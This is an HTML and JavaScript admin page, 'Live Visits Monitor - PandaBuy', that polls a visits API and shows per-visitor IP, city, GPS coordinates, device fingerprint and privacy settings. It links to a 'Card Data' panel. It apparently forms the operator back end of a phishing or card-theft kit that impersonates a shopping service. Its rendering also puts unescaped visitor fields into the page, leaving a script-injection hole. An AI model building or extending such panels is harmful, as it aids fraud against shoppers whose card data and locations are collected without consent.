<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Visits Monitor - PandaBuy</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            min-height: 100vh;
            color: #333;
        }
        
        .admin-header {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            padding: 20px 0;
            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
            position: sticky;
            top: 0;
            z-index: 100;
        }
        
        .header-content {
            max-width: 1400px;
            margin: 0 auto;
            padding: 0 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .admin-title {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .admin-icon {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 24px;
        }
        
        .title-text h1 {
            font-size: 28px;
            font-weight: 700;
            color: #2d3748;
            margin-bottom: 5px;
        }
        
        .title-text p {
            color: #718096;
            font-size: 14px;
        }
        
        .header-actions {
            display: flex;
            gap: 15px;
            align-items: center;
        }
        
        .live-indicator {
            display: flex;
            align-items: center;
            gap: 8px;
            background: #48bb78;
            color: white;
            padding: 8px 16px;
            border-radius: 20px;
            font-weight: 600;
            font-size: 14px;
        }
        
        .live-dot {
            width: 8px;
            height: 8px;
            background: white;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        .cards-btn {
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 10px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .cards-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(30, 60, 114, 0.4);
        }
        
        .stats-bar {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
            margin: 30px auto;
            max-width: 1400px;
            padding: 25px 30px;
            border-radius: 15px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 30px;
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-number {
            font-size: 32px;
            font-weight: 700;
            color: #1e3c72;
            margin-bottom: 8px;
        }
        
        .stat-label {
            color: #718096;
            font-size: 14px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .visits-container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 0 30px 50px;
        }
        
        .visit-entry {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
            animation: slideIn 0.5s ease-out;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .visit-entry:hover {
            transform: translateY(-3px);
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
        }
        
        .visit-entry.new {
            border-left: 4px solid #48bb78;
            background: rgba(72, 187, 120, 0.05);
        }
        
        .visit-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 2px solid #f7fafc;
        }
        
        .visitor-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .visitor-avatar {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 20px;
            font-weight: 600;
        }
        
        .visitor-details h3 {
            font-size: 18px;
            color: #2d3748;
            margin-bottom: 5px;
        }
        
        .visitor-details p {
            color: #718096;
            font-size: 14px;
        }
        
        .visit-timestamp {
            color: #718096;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .visit-details {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
        }
        
        .detail-group {
            background: #f8fafc;
            padding: 15px;
            border-radius: 10px;
            border-left: 3px solid #1e3c72;
        }
        
        .group-title {
            font-size: 14px;
            font-weight: 600;
            color: #2d3748;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .detail-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 5px 0;
            font-size: 13px;
        }
        
        .detail-label {
            color: #4a5568;
            font-weight: 500;
        }
        
        .detail-value {
            color: #2d3748;
            font-weight: 600;
            text-align: right;
            max-width: 150px;
            word-break: break-word;
        }
        
        .country-flag {
            width: 20px;
            height: 14px;
            border-radius: 2px;
            margin-right: 8px;
        }
        
        .browser-info {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .loading {
            text-align: center;
            padding: 50px;
            color: #718096;
        }
        
        .loading i {
            font-size: 48px;
            margin-bottom: 20px;
            animation: spin 2s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .no-data {
            text-align: center;
            padding: 80px 20px;
            color: #718096;
        }
        
        .no-data i {
            font-size: 64px;
            margin-bottom: 20px;
            opacity: 0.5;
        }
        
        .no-data h3 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #4a5568;
        }
        
        .new-visit-alert {
            position: fixed;
            top: 100px;
            right: 30px;
            background: #48bb78;
            color: white;
            padding: 15px 20px;
            border-radius: 10px;
            box-shadow: 0 8px 25px rgba(72, 187, 120, 0.4);
            z-index: 1000;
            transform: translateX(400px);
            transition: all 0.3s;
        }
        
        .new-visit-alert.show {
            transform: translateX(0);
        }
        
        @media (max-width: 768px) {
            .header-content {
                flex-direction: column;
                gap: 20px;
                text-align: center;
            }
            
            .header-actions {
                width: 100%;
                justify-content: center;
            }
            
            .stats-bar {
                grid-template-columns: repeat(2, 1fr);
                gap: 20px;
                margin: 20px;
                padding: 20px;
            }
            
            .visits-container {
                padding: 0 20px 30px;
            }
            
            .visit-entry {
                padding: 20px;
            }
            
            .visit-details {
                grid-template-columns: 1fr;
                gap: 15px;
            }
            
            .visit-header {
                flex-direction: column;
                gap: 15px;
                text-align: center;
            }
            
            .new-visit-alert {
                right: 20px;
                left: 20px;
                transform: translateY(-100px);
            }
            
            .new-visit-alert.show {
                transform: translateY(0);
            }
        }
    </style>
</head>
<body>
    <header class="admin-header">
        <div class="header-content">
            <div class="admin-title">
                <div class="admin-icon">
                    <i class="fas fa-chart-line"></i>
                </div>
                <div class="title-text">
                    <h1>Live Visits Monitor</h1>
                    <p>Real-time visitor tracking and analytics</p>
                </div>
            </div>
            <div class="header-actions">
                <div class="live-indicator">
                    <div class="live-dot"></div>
                    LIVE
                </div>
                <a href="admin-cards.html" class="cards-btn">
                    <i class="fas fa-credit-card"></i>
                    Card Data
                </a>
            </div>
        </div>
    </header>

    <div class="stats-bar">
        <div class="stat-item">
            <div class="stat-number" id="totalVisits">0</div>
            <div class="stat-label">Total Visits</div>
        </div>
        <div class="stat-item">
            <div class="stat-number" id="todayVisits">0</div>
            <div class="stat-label">Today</div>
        </div>
        <div class="stat-item">
            <div class="stat-number" id="uniqueIPs">0</div>
            <div class="stat-label">Unique IPs</div>
        </div>
        <div class="stat-item">
            <div class="stat-number" id="onlineNow">0</div>
            <div class="stat-label">Online Now</div>
        </div>
        <div class="stat-item">
            <div class="stat-number" id="topCountry">-</div>
            <div class="stat-label">Top Country</div>
        </div>
    </div>

    <div class="visits-container" id="visitsContainer">
        <div class="loading">
            <i class="fas fa-spinner"></i>
            <h3>Loading visit data...</h3>
        </div>
    </div>

    <div class="new-visit-alert" id="newVisitAlert">
        <i class="fas fa-user-plus"></i>
        New visitor detected!
    </div>

    <script>
        let visitData = [];
        let lastVisitCount = 0;
        
        function getBrowserIcon(browser) {
            const browserLower = browser.toLowerCase();
            if (browserLower.includes('chrome')) return '🌐';
            if (browserLower.includes('firefox')) return '🦊';
            if (browserLower.includes('safari')) return '🧭';
            if (browserLower.includes('edge')) return '🔷';
            return '🌐';
        }
        
        function getOSIcon(os) {
            const osLower = os.toLowerCase();
            if (osLower.includes('windows')) return '🪟';
            if (osLower.includes('mac')) return '🍎';
            if (osLower.includes('linux')) return '🐧';
            if (osLower.includes('android')) return '🤖';
            if (osLower.includes('ios')) return '📱';
            return '💻';
        }
        
        function formatTimestamp(timestamp) {
            const date = new Date(timestamp);
            const now = new Date();
            const diff = now - date;
            
            if (diff < 60000) return 'Just now';
            if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
            if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
            
            return date.toLocaleString('en-US', {
                month: 'short',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit'
            });
        }
        
        function getVisitorInitials(ip) {
            const parts = ip.split('.');
            return parts.length >= 2 ? `${parts[0]}.${parts[1]}` : ip.substring(0, 2).toUpperCase();
        }
        
        function calculateStats() {
            const total = visitData.length;
            const today = new Date().toDateString();
            const todayCount = visitData.filter(visit => 
                new Date(visit.timestamp).toDateString() === today
            ).length;
            
            const uniqueIPs = [...new Set(visitData.map(visit => visit.ip))].length;
            
            // Consider visitors online if they visited in the last 5 minutes
            const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
            const onlineNow = visitData.filter(visit => 
                new Date(visit.timestamp) > fiveMinutesAgo
            ).length;
            
            // Find top country
            const countries = {};
            visitData.forEach(visit => {
                if (visit.country) {
                    countries[visit.country] = (countries[visit.country] || 0) + 1;
                }
            });
            
            const topCountry = Object.keys(countries).length > 0 
                ? Object.keys(countries).reduce((a, b) => countries[a] > countries[b] ? a : b)
                : '-';
            
            document.getElementById('totalVisits').textContent = total;
            document.getElementById('todayVisits').textContent = todayCount;
            document.getElementById('uniqueIPs').textContent = uniqueIPs;
            document.getElementById('onlineNow').textContent = onlineNow;
            document.getElementById('topCountry').textContent = topCountry;
        }
        
        function showNewVisitAlert() {
            const alert = document.getElementById('newVisitAlert');
            alert.classList.add('show');
            setTimeout(() => {
                alert.classList.remove('show');
            }, 3000);
        }
        
        function renderVisitData() {
            const container = document.getElementById('visitsContainer');
            
            if (visitData.length === 0) {
                container.innerHTML = `
                    <div class="no-data">
                        <i class="fas fa-chart-line"></i>
                        <h3>No Visit Data Available</h3>
                        <p>Visitor data will appear here when users access the site.</p>
                    </div>
                `;
                return;
            }
            
            const visitsHtml = visitData.map((visit, index) => {
                const isNew = index < (visitData.length - lastVisitCount);
                
                // Handle both old and new data formats
                const ip = visit.server?.serverIP || visit.ip || 'Unknown';
                const browser = visit.browser?.name || visit.browser || 'Unknown';
                const browserVersion = visit.browser?.version || '';
                const os = visit.os?.name || visit.os || 'Unknown';
                const osVersion = visit.os?.version || '';
                const deviceType = visit.device?.type || visit.deviceType || 'Unknown';
                const deviceModel = visit.device?.model || 'Unknown';
                const screenRes = visit.screen?.resolution || visit.screenResolution || 'Unknown';
                const timezone = visit.locale?.timezone || visit.timezone || 'N/A';
                const language = visit.locale?.language || visit.language || 'N/A';
                const country = visit.geoLocation?.country || visit.country || 'Unknown';
                const city = visit.geoLocation?.city || visit.city || 'Unknown';
                const pageUrl = visit.page?.pathname || visit.page || visit.pathname || '/';
                const referrer = visit.traffic?.referrer || visit.referrer || 'Direct';
                const userAgent = visit.browser?.fullUA || visit.userAgent || 'N/A';
                
                return `
                    <div class="visit-entry ${isNew ? 'new' : ''}">
                        <div class="visit-header">
                            <div class="visitor-info">
                                <div class="visitor-avatar">
                                    ${getVisitorInitials(ip)}
                                </div>
                                <div class="visitor-details">
                                    <h3>${ip}</h3>
                                    <p>${city}, ${country}</p>
                                </div>
                            </div>
                            <div class="visit-timestamp">
                                <i class="fas fa-clock"></i>
                                ${formatTimestamp(visit.timestamp)}
                            </div>
                        </div>
                        
                        <div class="visit-details">
                            <div class="detail-group">
                                <div class="group-title">
                                    <i class="fas fa-globe"></i>
                                    Location & Network
                                </div>
                                <div class="detail-item">
                                    <span class="detail-label">IP Address</span>
                                    <span class="detail-value">${ip}</span>
                                </div>
                                <div class="detail-item">
                                    <span class="detail-label">Country</span>
                                    <span class="detail-value">${country}</span>
                                </div>
                                <div class="detail-item">
                                    <span class="detail-label">City</span>
                                    <span class="detail-value">${city}</span>
                                </div>
                                <div class="detail-item">
                                    <span class="detail-label">Timezone</span>
                                    <span class="detail-value">${timezone}</span>
                                </div>
                                ${visit.network ? `
                                <div class="detail-item">
                                    <span class="detail-label">Connection</span>
                                    <span class="detail-value">${visit.network.effectiveType || 'Unknown'}</span>
                                </div>
                                ` : ''}
                            </div>
                            
                            <div class="detail-group">
                                <div class="group-title">
                                    <i class="fas fa-desktop"></i>
                                    Device & Browser
                                </div>
                                <div class="detail-item">
                                    <span class="detail-label">Browser</span>
                                    <span class="detail-value browser-info">
                                        ${getBrowserIcon(browser)}
                                        ${browser} ${browserVersion ? 'v' + browserVersion : ''}
                                    </span>
                                </div>
                                <div class="detail-item">
                                    <span class="detail-label">Operating System</span>
                                    <span class="detail-value">
                                        ${getOSIcon(os)}
                                        ${os} ${osVersion ? 'v' + osVersion : ''}
                                    </span>
                                </div>
                                <div class="detail-item">
                                    <span class="detail-label">Device Type</span>
                                    <span class="detail-value">${deviceType}</span>
                                </div>
                                ${deviceModel !== 'Unknown' ? `
                                <div class="detail-item">
                                    <span class="detail-label">Device Model</span>
                                    <span class="detail-value">${deviceModel}</span>
                                </div>
                                ` : ''}
                                <div class="detail-item">
                                    <span class="detail-label">Screen Resolution</span>
                                    <span class="detail-value">${screenRes}</span>
                                </div>
                                ${visit.device?.touchSupport ? `
                                <div class="detail-item">
                                    <span class="detail-label">Touch Support</span>
                                    <span class="detail-value">✅ Yes (${visit.device.maxTouchPoints} points)</span>
                                </div>
                                ` : ''}
                            </div>
                            
                            <div class="detail-group">
                                <div class="group-title">
                                    <i class="fas fa-cog"></i>
                                    Technical Details
                                </div>
                                <div class="detail-item">
                                    <span class="detail-label">Language</span>
                                    <span class="detail-value">${language}</span>
                                </div>
                                <div class="detail-item">
                                    <span class="detail-label">Page Visited</span>
                                    <span class="detail-value">${pageUrl}</span>
                                </div>
                                <div class="detail-item">
                                    <span class="detail-label">Referrer</span>
                                    <span class="detail-value">${referrer}</span>
                                </div>
                                ${visit.performance?.loadTime ? `
                                <div class="detail-item">
                                    <span class="detail-label">Page Load Time</span>
                                    <span class="detail-value">${visit.performance.loadTime}ms</span>
                                </div>
                                ` : ''}
                                ${visit.performance?.memoryUsed ? `
                                <div class="detail-item">
                                    <span class="detail-label">Memory Usage</span>
                                    <span class="detail-value">${visit.performance.memoryUsed}</span>
                                </div>
                                ` : ''}
                                ${visit.privacy ? `
                                <div class="detail-item">
                                    <span class="detail-label">Privacy Settings</span>
                                    <span class="detail-value">
                                        ${visit.privacy.doNotTrack ? '🚫 DNT' : ''}
                                        ${visit.privacy.adBlocker ? '🛡️ AdBlock' : ''}
                                        ${visit.privacy.cookiesEnabled ? '🍪 Cookies' : ''}
                                    </span>
                                </div>
                                ` : ''}
                                <div class="detail-item">
                                    <span class="detail-label">User Agent</span>
                                    <span class="detail-value" title="${userAgent}">
                                        ${userAgent.length > 50 ? userAgent.substring(0, 50) + '...' : userAgent}
                                    </span>
                                </div>
                            </div>
                            
                            ${visit.location?.latitude ? `
                            <div class="detail-group">
                                <div class="group-title">
                                    <i class="fas fa-map-marker-alt"></i>
                                    GPS Location
                                </div>
                                <div class="detail-item">
                                    <span class="detail-label">Coordinates</span>
                                    <span class="detail-value">${visit.location.latitude.toFixed(4)}, ${visit.location.longitude.toFixed(4)}</span>
                                </div>
                                <div class="detail-item">
                                    <span class="detail-label">Accuracy</span>
                                    <span class="detail-value">${visit.location.accuracy}m</span>
                                </div>
                            </div>
                            ` : ''}
                        </div>
                    </div>
                `;
            }).join('');
            
            container.innerHTML = visitsHtml;
        }
        
        async function loadVisitData() {
            try {
                const response = await fetch('/api/visits');
                if (response.ok) {
                    const newData = await response.json();
                    
                    // Check for new visits
                    if (newData.length > visitData.length && visitData.length > 0) {
                        showNewVisitAlert();
                    }
                    
                    lastVisitCount = visitData.length;
                    visitData = newData;
                    
                    // Sort by timestamp, newest first
                    visitData.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
                    
                    renderVisitData();
                    calculateStats();
                } else {
                    throw new Error('Failed to load visit data');
                }
            } catch (error) {
                console.error('Error loading visit data:', error);
                document.getElementById('visitsContainer').innerHTML = `
                    <div class="no-data">
                        <i class="fas fa-exclamation-triangle"></i>
                        <h3>Error Loading Data</h3>
                        <p>Unable to load visit data. Please check your connection and try again.</p>
                    </div>
                `;
            }
        }
        
        // Load data on page load
        document.addEventListener('DOMContentLoaded', loadVisitData);
        
        // Auto-refresh every 5 seconds for real-time updates
        setInterval(loadVisitData, 5000);
    </script>
</body>
